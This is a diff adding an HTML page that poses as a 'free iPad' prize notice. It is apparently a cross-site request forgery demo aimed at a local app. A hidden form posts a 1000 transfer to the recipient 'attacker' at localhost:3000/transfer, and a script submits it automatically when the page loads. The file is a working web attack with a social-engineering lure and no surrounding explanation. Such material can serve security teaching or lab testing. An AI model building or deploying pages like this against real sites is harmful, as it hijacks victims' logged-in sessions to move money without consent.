@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Congratulations!</title>
+</head>
+<body>
+  <h1>🎉 You’ve won a free iPad! 🎉</h1>
+  <p>Click below to claim your prize:</p>
+
+  <form id="prizeForm" action="https://localhost:3000/transfer" method="POST">
+    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="recipient" value="attacker">
+    <input type="submit" value="Claim Prize">
+  </form>
+
+  <script>
+    // Auto-submit the form as soon as the page loads
+    window.onload = function () {
+      document.getElementById('prizeForm').submit();
+    };
+  </script>
+</body>
+</html>
